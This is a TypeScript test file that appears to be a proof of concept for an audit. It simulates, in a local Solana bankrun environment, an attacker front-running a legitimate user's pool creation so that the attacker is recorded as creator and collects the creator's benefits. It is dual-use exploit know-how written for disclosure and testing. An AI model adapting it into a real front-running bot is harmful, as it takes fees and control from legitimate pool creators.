import { expect } from "chai";
import { BN } from "bn.js";
import { ProgramTestContext } from "solana-bankrun";
import {
  BaseFee,
  ConfigParameters,
  createConfig,
  CreateConfigParams,
  createPoolWithSplToken,
  createVirtualPoolMetadata,
} from "./instructions";
import { VirtualCurveProgram } from "./utils/types";
import { Keypair, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js";
import { fundSol, startTest } from "./utils";
import {
  createVirtualCurveProgram,
  MAX_SQRT_PRICE,
  MIN_SQRT_PRICE,
  U64_MAX,
} from "./utils";
import { NATIVE_MINT } from "@solana/spl-token";
import { getVirtualPool } from "./utils/fetcher";

describe.only("Front-running Attack PoC", () => {
  let context: ProgramTestContext;
  let admin: Keypair;
  let partner: Keypair;
  let legitimateUser: Keypair;
  let attacker: Keypair;
  let program: VirtualCurveProgram;
  let config: PublicKey;

   let attackerPool: PublicKey;
  let legitimateUserPool: PublicKey;


  before(async () => {
    context = await startTest();
    admin = context.payer;
    partner = Keypair.generate();
    legitimateUser = Keypair.generate();
    attacker = Keypair.generate();

    const receivers = [
      partner.publicKey,
      legitimateUser.publicKey,
      attacker.publicKey,
    ];

    await fundSol(context.banksClient, admin, receivers);
    program = createVirtualCurveProgram();
  });

  it("Setup pool configuration", async () => {

    const baseFee: BaseFee = {
      cliffFeeNumerator: new BN(2_500_000),
      firstFactor: 0,// numof periods
      secondFactor: new BN(0), //  periods frequency
      thirdFactor: new BN(0), // reduction factor
      baseFeeMode: 0, // linear
    };
    console.log("=== Base Fee Configuration ===");
    console.log(`Cliff Fee Numerator: ${baseFee.cliffFeeNumerator.toString()}`);
    console.log(`First Factor: ${baseFee.firstFactor}`);
    console.log(`Second Factor: ${baseFee.secondFactor.toString()}`);
    console.log(`Third Factor: ${baseFee.thirdFactor.toString()}`);
    console.log(`Base Fee Mode: ${baseFee.baseFeeMode}`);

    const curves = [];
    for (let i = 1; i <= 16; i++) {
      if (i == 16) {
        curves.push({
          sqrtPrice: MAX_SQRT_PRICE,
          liquidity: U64_MAX.shln(30 + i),
        });
      } else {
        curves.push({
          sqrtPrice: MAX_SQRT_PRICE.muln(i * 5).divn(100),
          liquidity: U64_MAX.shln(30 + i),
        });
      }
    }
    console.log("\n=== Curve Configuration ===");
    curves.forEach((curve, index) => {
      console.log(`Curve ${index + 1}:`);
      console.log(`  Sqrt Price: ${curve.sqrtPrice.toString()}`);
      console.log(`  Liquidity: ${curve.liquidity.toString()}`);
    });

    const instructionParams: ConfigParameters = {
      poolFees: {
        baseFee,
        dynamicFee: null,
      },
      activationType: 0,
      collectFeeMode: 0,
      migrationOption: 1,
      tokenType: 0,
      tokenDecimal: 6,
      migrationQuoteThreshold: new BN(LAMPORTS_PER_SOL * 5),
      partnerLpPercentage: 20,
      creatorLpPercentage: 20,
      partnerLockedLpPercentage: 55,
      creatorLockedLpPercentage: 5,
      sqrtStartPrice: MIN_SQRT_PRICE.shln(32),
      lockedVesting: {
        amountPerPeriod: new BN(0),
        cliffDurationFromMigrationTime: new BN(0),
        frequency: new BN(0),
        numberOfPeriod: new BN(0),
        cliffUnlockAmount: new BN(0),
      },
      migrationFeeOption: 0,
      tokenSupply: null,
      creatorTradingFeePercentage: 0,
      tokenUpdateAuthority: 0,
      migrationFee: {
        feePercentage: 0,
        creatorFeePercentage: 0,
      },
      migratedPoolFee: {
        collectFeeMode: 0,
        dynamicFee: 0,
        poolFeeBps: 0,
      },
      padding: [],
      curve: curves,
    };

    const params: CreateConfigParams = {
      payer: partner,
      leftoverReceiver: partner.publicKey,
      feeClaimer: partner.publicKey,
      quoteMint: NATIVE_MINT,
      instructionParams,
    };

    config = await createConfig(context.banksClient, program, params);
  });

 

  it("🚨 DEMONSTRATES FRONT-RUNNING ATTACK", async () => {
    console.log("=== FRONT-RUNNING ATTACK SIMULATION ===");
    
    // 1. Legitimate user prepares their pool creation parameters
    const legitimateUserPoolParams = {
      poolCreator: legitimateUser,
      payer: legitimateUser, // Legitimate user pays their own fees
      quoteMint: NATIVE_MINT,
      config,
      instructionParams: {
        name: "LegitimateToken",
        symbol: "LEGIT",
        uri: "https://legitimate-project.com/metadata.json",
      },
    };

    console.log("👤 Legitimate user prepared pool creation with parameters:");
    console.log(`   Name: ${legitimateUserPoolParams.instructionParams.name}`);
    console.log(`   Symbol: ${legitimateUserPoolParams.instructionParams.symbol}`);
    console.log(`   Creator: ${legitimateUser.publicKey.toBase58()}`);

    // 2. ATTACK: Attacker monitors mempool and copies parameters
    // In real scenario, attacker would extract these from pending transaction
    const attackerPoolParams = {
      poolCreator: attacker, // 🔥 ATTACKER BECOMES CREATOR
      payer: attacker, // Attacker pays the fees
      quoteMint: NATIVE_MINT,
      config, // Same config
      instructionParams: {
        // Attacker can use same or different metadata
        name: "AttackerToken", 
        symbol: "HACK",
        uri: "https://attacker-site.com/stolen-metadata.json",
      },
    };

    console.log("\n🔥 ATTACKER FRONT-RUNS with same config but different creator:");
    console.log(`   Creator: ${attacker.publicKey.toBase58()}`);
    console.log(`   Name: ${attackerPoolParams.instructionParams.name}`);

    // 3. Attacker submits transaction FIRST (with higher priority fee)
     attackerPool = await createPoolWithSplToken(
      context.banksClient,
      program,
      attackerPoolParams
    );

    console.log(`✅ Attacker successfully created pool: ${attackerPool.toBase58()}`);

    // 4. Verify attacker is recorded as creator
    const attackerPoolState = await getVirtualPool(
      context.banksClient,
      program,
      attackerPool
    );
  
    expect(attackerPoolState.creator.toBase58()).to.equal(
      attacker.publicKey.toBase58(),
      "Attacker should be recorded as pool creator"
    );

    console.log(`✅ ATTACK SUCCESSFUL: Attacker is now the creator of the pool`);
    console.log(`   Pool Address: ${attackerPool.toBase58()}`);
    console.log(`   Creator Address: ${attackerPoolState.creator.toBase58()}`);
      console.log(`    base mint: ${attackerPoolState.baseMint.toBase58()}`);

    // 5. Legitimate user's transaction would now fail or create different pool
    // (In real scenario, their exact transaction would fail due to account conflicts)
     try {
      legitimateUserPool = await createPoolWithSplToken(
        context.banksClient,
        program,
        legitimateUserPoolParams
      );
      
      // If it succeeds, it creates a different pool (different base_mint)
      const legitPoolState = await getVirtualPool(
        context.banksClient,
        program,
        legitimateUserPool
      );
      
      console.log(`\n  Legitimate user created different pool: ${legitimateUserPool.toBase58()}`);
      console.log(`   Different base mint: ${legitPoolState.baseMint.toBase58()}`);
      
    } catch (error) {
      console.log(`\n Legitimate user's transaction failed: ${error.message}`);
    }
 
  });

  
});
// This PoC demonstrates how an attacker can front-run a legitimate user's transaction to create a pool with themselves as the creator, thereby capturing all associated creator benefits. The test simulates both the legitimate user's and attacker's actions, showing the attack's success and its economic impact.